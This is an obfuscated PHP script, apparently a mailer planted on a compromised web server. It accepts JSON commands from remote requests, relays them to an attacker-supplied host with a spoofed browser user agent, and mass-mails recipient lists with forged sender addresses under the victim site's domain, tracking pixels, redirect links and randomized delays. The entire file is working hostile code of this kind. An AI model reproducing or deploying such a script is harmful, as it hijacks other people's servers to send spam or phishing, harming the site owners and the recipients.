<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spfbab04) { if ($spfbab04 == 'keys') { return array_keys($this->_keys); } } public function Import($spfbab04, $sp8c24e4) { if (is_array($sp8c24e4)) { $this->values[$spfbab04] = array(); foreach ($sp8c24e4 as $sp3485eb) { if (!empty($sp3485eb['key'])) { $this->values[$spfbab04][$sp3485eb['key']] = $sp3485eb['value']; } else { $this->values[$spfbab04][] = $sp3485eb['value']; } } } else { $this->Assign($spfbab04, $sp8c24e4); } } public function Assign($spfbab04, $sp4ca450) { $this->values[$spfbab04] = $sp4ca450; } public function Parse($sp35c062) { $sp98d035 = ''; $sp7b2f24 = 0; while (true) { $spa8d9c3 = strpos($sp35c062, '{', $sp7b2f24); if ($spa8d9c3 === false) { $sp98d035 .= substr($sp35c062, $sp7b2f24); break; } $sp98d035 .= substr($sp35c062, $sp7b2f24, $spa8d9c3 - $sp7b2f24); $sp7b2f24 = $spa8d9c3 + 1; $sp51b779 = ''; $spe4b1f3 = '{'; $spf193c2 = array(); $sp6bea5b = false; $sp07e443 = false; $sp00ee84 = 'var'; while ($sp7b2f24 < strlen($sp35c062)) { $spb81bb1 = substr($sp35c062, $sp7b2f24, 1); $spe4b1f3 .= $spb81bb1; if ($spb81bb1 == ',' || $spb81bb1 == '>' || $spb81bb1 == '|') { if ($sp00ee84 == 'alias') { $sp6bea5b = $sp51b779; } elseif ($sp00ee84 == 'mod') { $sp07e443 = $sp51b779; } else { $spf193c2[] = $sp51b779; } $sp51b779 = ''; if ($spb81bb1 == '>') { $sp00ee84 = 'alias'; } if ($spb81bb1 == '|') { $sp00ee84 = 'mod'; } $sp7b2f24++; continue; } if ($spb81bb1 == '}') { if ($sp00ee84 == 'alias') { $sp6bea5b = $sp51b779; } elseif ($sp00ee84 == 'mod') { $sp07e443 = $sp51b779; } else { $spf193c2[] = $sp51b779; } $sp7b2f24++; break; } $sp51b779 .= $spb81bb1; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spb81bb1) == 0) { $sp7b2f24++; $spf193c2 = array(); break; } $sp7b2f24++; } if (sizeof($spf193c2) == 0) { $sp98d035 .= $spe4b1f3; continue; } $sp313a8a = false; $spcd39dc = false; if (preg_match('/^\\^/', $spf193c2[0]) > 0) { $spf193c2[0] = substr($spf193c2[0], 1); $sp313a8a = true; } if (preg_match('/^\\!/', $spf193c2[0]) > 0) { $spf193c2[0] = substr($spf193c2[0], 1); $spcd39dc = true; } $spa4e1f2 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spf193c2[0], $sp917e46) > 0) { $spa4e1f2 = $sp917e46[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spf193c2[0], $sp917e46) > 0) { $spa4e1f2 = explode('-', $sp917e46[1]); } if ($spa4e1f2 !== false) { $spf193c2[0] = substr($spf193c2[0], 0, strpos($spf193c2[0], '[')); } $this->_keys[$spf193c2[0]] = true; if (empty($this->values[$spf193c2[0]]) && empty($this->fixed[$spf193c2[0]])) { continue; } if ($sp313a8a) { unset($this->fixed[$spf193c2[0]]); } if (isset($this->fixed[$spf193c2[0]])) { $sp6b29e4 = $this->fixed[$spf193c2[0]]; } else { $sp6b29e4 = ''; $sp648d94 = 1; if (sizeof($spf193c2) == 2) { $sp648d94 = $spf193c2[1]; } if (sizeof($spf193c2) == 3) { $sp648d94 = rand($spf193c2[1], $spf193c2[2]); } for ($sp69a90d = 0; $sp69a90d < $sp648d94; $sp69a90d++) { if (is_array($this->values[$spf193c2[0]])) { if (!is_array($this->used[$spf193c2[0]])) { $this->used[$spf193c2[0]] = array(); } if (count($this->used[$spf193c2[0]]) == count($this->values[$spf193c2[0]])) { $this->used[$spf193c2[0]] = array(); } if ($spa4e1f2 !== false && is_scalar($spa4e1f2)) { $sp6b29e4 .= $this->values[$spf193c2[0]][$spa4e1f2]; $this->used[$spa4e1f2] = true; } else { $sp188cc8 = array(); if (is_array($spa4e1f2)) { $sp10d093 = $spa4e1f2[0]; $sp43d807 = $spa4e1f2[1]; } else { $sp10d093 = 0; $sp43d807 = count($this->values[$spf193c2[0]]) - 1; } for ($spe0d713 = $sp10d093; $spe0d713 <= $sp43d807; $spe0d713++) { if ($spcd39dc && !empty($this->used[$spf193c2[0]][$spe0d713])) { continue; } $sp188cc8[] = $spe0d713; } $spef324a = $sp188cc8[rand(0, count($sp188cc8) - 1)]; $this->used[$spf193c2[0]][$spef324a] = true; $sp6b29e4 .= $this->values[$spf193c2[0]][$spef324a]; } } else { $sp6b29e4 .= $this->values[$spf193c2[0]]; } } } $sp6b29e4 = $this->Parse($sp6b29e4); if ($sp07e443 !== false) { for ($sp3fd4da = 0; $sp3fd4da < strlen($sp07e443); $sp3fd4da++) { switch (substr($sp07e443, $sp3fd4da, 1)) { case 'b': $sp6b29e4 = base64_encode($sp6b29e4); break; case 'q': $sp6b29e4 = quoted_printable_encode($sp6b29e4); break; default: break; } } } if ($sp313a8a) { $this->fixed[$spf193c2[0]] = $sp6b29e4; } if ($sp6bea5b !== false && $sp6bea5b != '') { $this->fixed[$sp6bea5b] = $sp6b29e4; } $sp98d035 .= $sp6b29e4; } return $sp98d035; } } $sp49d90c = file_get_contents('php://input'); $spf4f2e2 = json_decode($sp49d90c, true); if (empty($spf4f2e2['via_proxy'])) { $spf4f2e2['via_proxy'] = true; $sp0b5962 = curl_init($spf4f2e2['prefix'] . $spf4f2e2['files']['s']); $spcd8a28 = json_encode($spf4f2e2); curl_setopt($sp0b5962, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp0b5962, CURLOPT_TIMEOUT, 600); curl_setopt($sp0b5962, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp0b5962, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp0b5962, CURLOPT_REFERER, $sp9fe90b); curl_setopt($sp0b5962, CURLOPT_POST, true); curl_setopt($sp0b5962, CURLOPT_POSTFIELDS, $spcd8a28); curl_setopt($sp0b5962, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spcd8a28))); $spc369c3 = curl_exec($sp0b5962); echo $spc369c3; die; } $sp6af056 = $_SERVER['SERVER_ADDR']; $spb3d4d2 = $_SERVER['HTTP_HOST']; $spb3d4d2 = preg_replace('/^www\\./', '', $spb3d4d2); $sp5e6e81 = new Macros(); $sp5e6e81->Assign('server_addr', $sp6af056); $sp5e6e81->Assign('server_host', $spb3d4d2); foreach ($spf4f2e2['macros'] as $spfbab04 => $sp8c24e4) { $sp5e6e81->Import($spfbab04, $sp8c24e4); } $spbb5ce0 = preg_replace('/^www\\./i', '', $spb3d4d2); $sp3f7ad1 = $sp5e6e81->Parse('{from_user}@' . $spbb5ce0); $sp5e6e81->Assign('from_email', $sp3f7ad1); $sp5e6e81->Assign('prefix', $spf4f2e2['prefix']); $sp5e6e81->Assign('html', $spf4f2e2['letter']['html']); $sp7b2f24 = 0; $spe0a946 = 0; $sp63b594 = 0; $sp234bbf = array(); foreach ($spf4f2e2['rcpt'] as $spb1dc9b) { $sp5e6e81->Assign('email', $spb1dc9b['email']); $sp5e6e81->Assign('entry', $spb1dc9b); $sp5e6e81->Assign('date', date('r')); $sp5e6e81->Assign('redirect', $spf4f2e2['prefix'] . $spf4f2e2['files']['r']); $sp5e6e81->Assign('redirect_with_uri', $spf4f2e2['prefix'] . $spf4f2e2['files']['r'] . '?uri='); $sp5e6e81->Assign('unsubscribe', $spf4f2e2['prefix'] . $spf4f2e2['files']['u'] . '?id=' . $spb1dc9b['id']); $sp5e6e81->Assign('delivery', '<img src="' . $spf4f2e2['prefix'] . $spf4f2e2['files']['d'] . '?id=' . $spb1dc9b['id'] . '" />'); $sp01dd55 = $sp5e6e81->Parse($spf4f2e2['envelope']['header']); $spa8c5e1 = $sp5e6e81->Parse($spf4f2e2['envelope']['body']); if (!empty($spb1dc9b['name'])) { $spe8e307 = $spb1dc9b['name'] . ' <' . $spb1dc9b['email'] . '>'; } else { $spe8e307 = $spb1dc9b['email']; } $spc55c99 = $sp5e6e81->Parse($spf4f2e2['letter']['subject']); if ($sp7b2f24 > 0) { sleep(rand(3, 8)); } $sp131cde = mail($spe8e307, $spc55c99, $spa8c5e1, $sp01dd55); $sp234bbf[$spb1dc9b['id']] = $sp131cde; if ($sp131cde) { $spe0a946++; } else { $sp63b594++; } $sp7b2f24++; } echo serialize(array('total' => count($spf4f2e2['rcpt']), 'sent' => $sp7b2f24, 'success' => $spe0a946, 'error' => $sp63b594, 'rcpt' => $sp234bbf));